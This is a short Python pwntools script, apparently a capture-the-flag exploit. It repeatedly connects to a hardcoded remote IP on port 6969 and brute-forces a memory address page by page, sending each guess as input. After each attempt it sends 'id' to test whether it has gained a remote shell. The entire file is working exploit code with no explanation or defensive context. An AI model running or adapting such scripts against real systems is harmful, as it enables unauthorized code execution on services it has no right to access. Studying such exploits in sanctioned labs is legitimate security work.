from pwn import *
#context.log_level='debug'

def main():
    start = 0x3A1BD70AC000 - 0x1000
    start -= 0x10000

    while True:
        try:
            print("%08X" % start)
            r = remote('54.202.7.144', 6969)
            #r = remote('localhost', 8080)
            r.recvuntil(' : ')
            r.send("j\n")
            r.recvuntil(' ')
            r.send(("%d\n" % start).ljust(0x64))
            r.send("id\nid\n")
            print(r.readline())
            print("FOUND: %08X" % start)
            break
        except:
            pass
        finally:
            r.close()
            start += 0x1000

if __name__ == "__main__":
    main()
